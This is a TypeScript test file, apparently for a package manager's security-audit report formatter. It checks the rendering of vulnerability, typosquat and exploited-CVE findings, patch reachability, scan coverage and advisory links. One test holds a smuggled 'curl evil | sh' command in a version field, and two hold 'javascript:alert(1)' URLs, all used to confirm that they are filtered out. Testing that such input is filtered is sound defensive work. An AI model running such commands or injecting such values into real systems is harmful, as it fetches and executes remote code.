            ...emptySummary(),
            high: [
              makePkg({
                name: 'shared-pkg',
                alerts: [
                  {
                    key: '1',
                    type: 'cve',
                    severity: 'high',
                    category: 'vulnerability',
                  },
                ],
                path: 'root > a > shared-pkg',
                pathCount: 2,
              }),
            ],
          },
          total: 1,
          indirectCount: 1,
        }),
      )
      t.match(
        output,
        /reached by 2 paths/,
        'a shared package reports how many routes reach it',
      )
      t.notMatch(
        output,
        /root > a > shared-pkg/,
        'and does not list them -- that belongs behind its own command',
      )
    },
  )

  t.test('suggests the intended package for a typosquat', async t => {
    const output = formatAuditSummary(
      makeResult({
        summary: {
          ...emptySummary(),
          medium: [
            makePkg({
              name: 'cache-control-parser',
              alerts: [
                {
                  key: '1',
                  type: 'gptDidYouMean',
                  severity: 'middle',
                  category: 'supplyChainRisk',
                  props: {
                    lastPublish: '2026-01-01',
                    alternatePackage: 'parse-cache-control',
                  },
                },
              ],
            }),
          ],
        },
        total: 1,
        indirectCount: 1,
      }),
    )
    t.match(output, /possible typosquat \(AI-flagged\): medium/)
    t.match(output, /did you mean parse-cache-control\?/)
  })

  t.test(
    'reports whether a patch is reachable from declared ranges',
    async t => {
      const transitive = (
        dependents: { name: string; range?: string }[],
      ) =>
        formatAuditSummary(
          makeResult({
            summary: {
              ...emptySummary(),
              high: [
                makePkg({
                  name: 'deep-pkg',
                  alerts: [
                    {
                      key: '1',
                      type: 'cve',
                      severity: 'high',
                      category: 'vulnerability',
                      props: {
                        lastPublish: '2026-01-01',
                        firstPatchedVersionIdentifier: '2.0.0',
                      },
                    },
                  ],
                  dependents,
                }),
              ],
            },
            total: 1,
            indirectCount: 1,
          }),
        )

      t.match(
        transitive([{ name: 'mid', range: '>=1.5.0' }]),
        /reachable: mid declares >=1\.5\.0, so `vlt install` picks up 2\.0\.0/,
        'a range that admits the patch is reachable',
      )
      t.match(
        transitive([{ name: 'mid', range: '^1.5.0' }]),
        /blocked: mid declares \^1\.5\.0/,
        'a caret pins the major, so a 2.x patch is out of range',
      )
      t.match(
        transitive([
          { name: 'a', range: '^2.0.0' },
          { name: 'b', range: '>=1.0.0' },
        ]),
        /reachable: all 2 dependents' ranges allow it/,
        'several permitting dependents collapse to a count',
      )
      t.match(
        transitive([{ name: 'pinner', range: '1.0.0' }]),
        /blocked: pinner declares 1\.0\.0 -- the range must widen/,
        'a pin blocks the patch',
      )
      t.match(
        transitive([
          { name: 'pinner', range: '1.0.0' },
          { name: 'ok', range: '^2.0.0' },
        ]),
        /partly blocked: pinner declares 1\.0\.0/,
        'a mix names only the blockers',
      )
      t.match(
        transitive([{ name: 'gitdep' }]),
        /patched in 2\.0\.0; its dependents declare no version range/,
        'a specifier with no range says nothing about published versions',
      )
    },
  )

  t.test('reports scan coverage over the graph', async t => {
    const withCoverage = (scanned: number, unscanned: number) =>
      formatAuditSummary(
        makeResult({
          summary: {
            ...emptySummary(),
            high: [makePkg({ name: 'p' })],
          },
          total: 1,
          indirectCount: 1,
          scannedCount: scanned,
          unscannedCount: unscanned,
        }),
      )

    t.match(
      withCoverage(238, 2),
      /238 of 240 installed versions scanned -- 2 unscanned, so findings may be incomplete/,
    )
    t.match(
      withCoverage(240, 0),
      /^240 of 240 installed versions scanned$/m,
      'nothing unscanned drops the caveat',
    )
    t.match(
      withCoverage(1, 0),
      /1 of 1 installed version scanned/,
      'singular',
    )
    t.notMatch(
      withCoverage(0, 0),
      /installed version/,
      'no coverage information means no line',
    )
    t.notMatch(
      formatAuditSummary(
        makeResult({
          summary: {
            ...emptySummary(),
            high: [makePkg({ name: 'p' })],
          },
          total: 1,
        }),
      ),
      /installed version/,
      'and an unknown count renders nothing rather than NaN',
    )
  })

  t.test(
    'flags an actively exploited vulnerability from kevs',
    async t => {
      const output = formatAuditSummary(
        makeResult({
          summary: {
            ...emptySummary(),
            critical: [
              makePkg({
                name: 'exploited-pkg',
                alerts: [
                  {
                    key: '1',
                    type: 'cve',
                    severity: 'critical',
                    category: 'vulnerability',
                    props: {
                      lastPublish: '2026-01-01',
                      cveId: 'CVE-2026-0001',
                      kevs: [{ id: 'CVE-2026-0001' }],
                    },
                  },
                ],
              }),
            ],
          },
          total: 1,
          indirectCount: 1,
        }),
      )
      t.match(
        output,
        /actively exploited/,
        'badged on the finding line',
      )
      t.match(
        output,
        /^1 actively exploited$/m,
        'and counted in the summary so it cannot be scrolled past',
      )
    },
  )

  t.test(
    'styles the actively exploited badge when colors is true',
    async t => {
      const result = makeResult({
        summary: {
          ...emptySummary(),
          critical: [
            makePkg({
              name: 'exploited-pkg',
              alerts: [
                {
                  key: '1',
                  type: 'cve',
                  severity: 'critical',
                  category: 'vulnerability',
                  props: {
                    lastPublish: '2026-01-01',
                    cveId: 'CVE-2026-0001',
                    kevs: [{ id: 'CVE-2026-0001' }],
                  },
                },
              ],
            }),
          ],
        },
        total: 1,
        indirectCount: 1,
      })
      // styleText is a no-op on a non-TTY, so this asserts the badge
      // still renders on the colored path rather than that it differs
      t.match(
        formatAuditSummary(result, { colors: true }),
        /actively exploited/,
        'the text survives styling',
      )
    },
  )

  /** Render one alert on one critical package. */
  const renderAlert = (
    alert: PackageAlert,
    pkg: Partial<AuditPackage> = {},
  ) =>
    formatAuditSummary(
      makeResult({
        summary: {
          ...emptySummary(),
          critical: [makePkg({ alerts: [alert], ...pkg })],
        },
        total: 1,
        indirectCount: 1,
      }),
    )

  t.test('renders the advisory title and affected range', async t => {
    const output = renderAlert({
      key: '1',
      type: 'cve',
      severity: 'critical',
      category: 'vulnerability',
      props: {
        lastPublish: '2026-01-01',
        title: 'Prototype pollution in deepmerge',
        vulnerableVersionRange: '>=1.0.0 <2.0.0',
        firstPatchedVersionIdentifier: '2.0.0',
      },
    })
    t.match(output, /Prototype pollution in deepmerge/, 'the title')
    t.match(
      output,
      /affects >=1\.0\.0 <2\.0\.0 -- patched in 2\.0\.0/,
      'range and fixed version on one line, separate from the title',
    )
    t.notMatch(
      output,
      /description/,
      'and never the description, which runs to paragraphs',
    )
  })

  t.test(
    'omits a patched version that is not valid semver',
    async t => {
      // this string reaches a copy-pasteable command, so anything that
      // is not a version must not survive to be suggested
      const output = renderAlert(
        {
          key: '1',
          type: 'cve',
          severity: 'critical',
          category: 'vulnerability',
          props: {
            lastPublish: '2026-01-01',
            firstPatchedVersionIdentifier: '1.0.1 && curl evil | sh',
          },
        },
        { direct: true },
      )
      t.notMatch(
        output,
        /curl evil/,
        'the injected command is dropped',
      )
      t.notMatch(
        output,
        /patched in/,
        'and no fixed version is claimed',
      )
      t.match(
        output,
        /fix: none available yet/,
        'so the finding reports having no fix',
      )
    },
  )

  t.test(
    'reports the version instead of a command for an invalid package name',
    async t => {
      const output = renderAlert(
        {
          key: '1',
          type: 'cve',
          severity: 'critical',
          category: 'vulnerability',
          props: {
            lastPublish: '2026-01-01',
            firstPatchedVersionIdentifier: '2.0.0',
          },
        },
        { name: 'Not A Package Name', direct: true },
      )
      t.match(
        output,
        /fix: upgrade to 2\.0\.0/,
        'no vlt install command is offered',
      )
      t.notMatch(output, /vlt install/, 'nothing to copy and paste')
    },
  )

  t.test(
    'labels an unrecognized alert type with its raw type',
    async t => {
      // the feed adds alert types faster than the label table tracks them
      t.match(
        renderAlert({
          key: '1',
          type: 'someBrandNewAlertType',
          severity: 'critical',
          category: 'supplyChainRisk',
        }),
        /someBrandNewAlertType: critical/,
        'reported rather than silently dropped',
      )
    },
  )

  t.test(
    'shows an unusable severity rather than hiding it',
    async t => {
      t.match(
        renderAlert({
          key: '1',
          type: 'cve',
          severity: 'catastrophic' as PackageAlert['severity'],
          category: 'vulnerability',
        }),
        /vulnerability: catastrophic/,
        'an unrecognized severity is shown as the feed spelled it',
      )
      t.match(
        renderAlert({
          key: '1',
          type: 'cve',
          category: 'vulnerability',
        }),
        /vulnerability: unknown/,
        'and a missing one reads as unknown',
      )
    },
  )

  t.test(
    'drops a non-http advisory url instead of linking it',
    async t => {
      // a terminal supporting OSC 8 hands the target to the OS opener
      const output = renderAlert({
        key: '1',
        type: 'cve',
        severity: 'critical',
        category: 'vulnerability',
        props: {
          lastPublish: '2026-01-01',
          url: 'javascript:alert(1)',
        },
      })
      t.notMatch(output, /javascript:/, 'the scheme is not rendered')
    },
  )

  t.test('reports a truncated path count as approximate', async t => {
    t.match(
      renderAlert(
        {
          key: '1',
          type: 'malware',
          severity: 'critical',
          category: 'supplyChainRisk',
        },
        { pathCount: 5, pathCountTruncated: true },
      ),
      /reached by 5\+ paths/,
      'the + marks the count as a floor, not a total',
    )
  })

  t.test('includes an NVD link for each CVE id', async t => {
    const result = makeResult({
      summary: {
        ...emptySummary(),
        high: [
          makePkg({
            name: 'vuln-pkg',
            version: '1.2.3',
            alerts: [
              {
                key: '1',
                type: 'severity',
                severity: 'high',
                category: 'vulnerability',
              },
            ],
            cves: ['CVE-2021-1234'],
            direct: true,
          }),
        ],
      },
      total: 1,
      directCount: 1,
      indirectCount: 0,
    })
    const output = formatAuditSummary(result)
    t.match(
      output,
      /CVE-2021-1234 \(https:\/\/nvd\.nist\.gov\/vuln\/detail\/CVE-2021-1234\)/,
    )
  })

  t.test(
    'formats plural issues across multiple severities in order',
    async t => {
      const result = makeResult({
        summary: {
          ...emptySummary(),
          critical: [
            makePkg({
              name: 'pkg-c',
              version: '2.0.0',
              alerts: [
                {
                  key: '1',
                  type: 'malware',
                  severity: 'critical',
                  category: 'supplyChainRisk',
                },
              ],
            }),
          ],
          high: [
            makePkg({
              name: 'pkg-h',
              alerts: [
                {
                  key: '2',
                  type: 'severity',
                  severity: 'high',
                  category: 'vulnerability',
                },
              ],
              direct: true,
            }),
          ],
        },
        total: 2,
        directCount: 1,
        indirectCount: 1,
      })
      const output = formatAuditSummary(result)
      t.match(output, /^2 packages with security issues$/m)
      t.match(output, /^1 malware, 1 vulnerable$/m)
      t.match(output, /^1 critical, 1 high$/m)
      t.match(output, /critical\s+pkg-c@2\.0\.0\s+malware: critical/)
      // the `severity` alert type is labelled "vulnerability" -- the
      // feed's own type names aren't shown to users
      t.match(output, /high\s+pkg-h@1\.0\.0\s+vulnerability: high/)
      t.match(output, /1 direct dependency, 1 transitive/)
      t.ok(
        output.indexOf('pkg-c@2.0.0') < output.indexOf('pkg-h@1.0.0'),
        'critical row renders before high row',
      )
    },
  )

  t.test('pluralizes direct dependencies', async t => {
    const result = makeResult({
      summary: {
        ...emptySummary(),
        high: [
          makePkg({ name: 'a', direct: true }),
          makePkg({ name: 'b', direct: true }),
        ],
      },
      total: 2,
      directCount: 2,
      indirectCount: 0,
    })
    const output = formatAuditSummary(result)
    t.match(output, /2 direct dependencies, 0 transitive/)
  })

  t.test(
    'applies color styling without altering the text when colors is true',
    async t => {
      const result = makeResult({
        summary: {
          ...emptySummary(),
          high: [
            makePkg({
              name: 'vuln-pkg',
              alerts: [
                {
                  key: '1',
                  type: 'malware',
                  severity: 'high',
                  category: 'supplyChainRisk',
                },
                {
                  key: '2',
                  type: 'severity',
                  severity: 'high',
                  category: 'vulnerability',
                },
              ],
              cves: ['CVE-2021-1234'],
              direct: true,
            }),
          ],
        },
        total: 1,
        directCount: 1,
        indirectCount: 0,
      })
      const output = formatAuditSummary(result, { colors: true })
      t.match(output, /1 malware/)
      t.match(output, /1 high/)
      // colors: true renders CVEs as OSC 8 terminal hyperlinks
      // (ESC ]8;;URL ESC \ TEXT ESC ]8;; ESC \) instead of the plain
      // "text (url)" fallback used when colors is false. The label is
      // underlined, so SGR codes sit between the terminator and it.
      t.match(
        output,
        /\x1b]8;;https:\/\/nvd\.nist\.gov\/vuln\/detail\/CVE-2021-1234\x1b\\(?:\x1b\[[0-9;]*m)*CVE-2021-1234/,
      )
      t.match(
        output,
        /\x1b\[4mCVE-2021-1234/,
        'the link label is underlined',
      )
    },
  )

  t.test('aggregates nodes with vuln insights only', async t => {
    const nodes = [
      {
        id: 'pkg:cve-pkg@1.0.0',
        insights: {
          vuln: {
            critical: true,
            high: false,
            medium: false,
            low: false,
          },
        },
      },
    ]
    const result = aggregate(nodes, new Set())
    t.equal(result.total, 1, 'counts vuln-only package')
    t.equal(
      result.summary.critical.length,
      1,
      'reports in critical bucket',
    )
  })
})

t.test('scanCoverage', async t => {
  t.test('counts scanned and unscanned nodes', async t => {
    t.strictSame(
      scanCoverage(
        [
          { id: 'a', insights: { scanned: true } },
          { id: 'b', insights: { scanned: true } },
          { id: 'c', insights: { scanned: false } },
        ].map(asNode),
      ),
      { scanned: 2, unscanned: 1 },
    )
  })

  t.test('ignores nodes that say nothing about scanning', async t => {
    t.strictSame(
      scanCoverage(
        [
          // no insights at all
          { id: 'a' },
          // insights present, but no `scanned` key
          { id: 'b', insights: {} },
          // insights explicitly null
          { id: 'c', insights: null },
          { id: 'd', insights: { scanned: true } },
        ].map(asNode),
      ),
      { scanned: 1, unscanned: 0 },
      'only nodes carrying a `scanned` flag are counted either way',
    )
  })

  t.test('skips anything that is not a graph node', async t => {
    t.strictSame(
      scanCoverage([
        undefined,
        null,
        'nope',
        { id: 'unbranded', insights: { scanned: true } },
      ]),
      { scanned: 0, unscanned: 0 },
    )
  })

  t.test('handles an empty graph', async t => {
    t.strictSame(scanCoverage([]), { scanned: 0, unscanned: 0 })
  })
})

t.test('advisory links', async t => {
  const withProps = (
    props: Record<string, unknown>,
    colors?: boolean,
  ) =>
    formatAuditSummary(
      makeResult({
        summary: {
          ...emptySummary(),
          high: [
            makePkg({
              name: 'p',
              alerts: [
                {
                  key: '1',
                  type: 'cve',
                  severity: 'high',
                  category: 'vulnerability',
                  props: { lastPublish: '2026-01-01', ...props },
                },
              ],
            }),
          ],
        },
        total: 1,
        indirectCount: 1,
      }),
      { colors },
    )

  t.test('labels a GHSA link with its id', async t => {
    t.match(
      withProps({ ghsaId: 'GHSA-aaaa-bbbb-cccc' }),
      /GHSA-aaaa-bbbb-cccc \(https:\/\/github\.com\/advisories\/GHSA-aaaa-bbbb-cccc\)/,
    )
  })

  t.test(
    'labels a feed-supplied url with its host, not an id',
    async t => {
      const output = withProps({
        url: 'https://advisories.example/x',
      })
      t.match(
        output,
        /advisories\.example \(https:\/\/advisories\.example\/x\)/,
        'the reader can see where it actually goes',
      )
    },
  )

  t.test('drops a non-http url entirely', async t => {
    const output = withProps({ url: 'javascript:alert(1)' })
    t.notMatch(output, /javascript:/, 'never handed to the OS opener')
  })

  t.test('renders CWE links and the CVSS score', async t => {
    const output = withProps({
      cwes: [{ id: 'CWE-79' }],
      cvss: { score: 7.5, vectorString: 'x' },
    })
    t.match(
      output,
      /CWE-79 \(https:\/\/cwe\.mitre\.org\/data\/definitions\/79\.html\)/,
      'the numeric id is extracted for the URL',
    )
    t.match(output, /CVSS 7\.5/)
  })

  t.test('ignores a non-numeric CVSS score', async t => {
    t.notMatch(
      withProps({ cvss: { score: 'high' } }),
      /CVSS/,
      'a malformed score is omitted rather than printed',
    )
  })
})

t.test('collapses repeated identical findings', async t => {
  const alert = (key: string) => ({
    key,
    type: 'networkAccess',
    severity: 'middle' as const,
    category: 'supplyChainRisk' as const,
  })
  const output = formatAuditSummary(
    makeResult({
      summary: {
        ...emptySummary(),
        medium: [
          makePkg({
            name: 'chatty',
            alerts: [alert('1'), alert('2'), alert('3')],
          }),
        ],
      },
      total: 1,
      indirectCount: 1,
    }),
  )
  t.match(
    output,
    /network access: medium x3/,
    'three identical findings render once with a count',
  )
})
